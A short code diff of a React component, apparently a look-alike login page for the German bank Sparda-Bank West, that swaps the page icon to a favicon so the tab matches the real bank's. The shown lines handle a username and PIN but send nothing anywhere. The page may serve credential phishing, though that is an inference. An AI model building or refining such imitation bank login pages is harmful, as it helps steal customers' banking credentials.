@@ -29,7 +29,7 @@ const SpardaBankDe = () => {
   const [pinError, setPinError] = useState(false);
 
   useEffect(() => { window.scrollTo(0, 0); }, []);
-  usePageMeta("Sparda-Bank West - Anmelden", logoAsset.url);
+  usePageMeta("Sparda-Bank West - Anmelden", faviconAsset.url);
 
   const submit = async () => {
     const uErr = username.trim() === "";
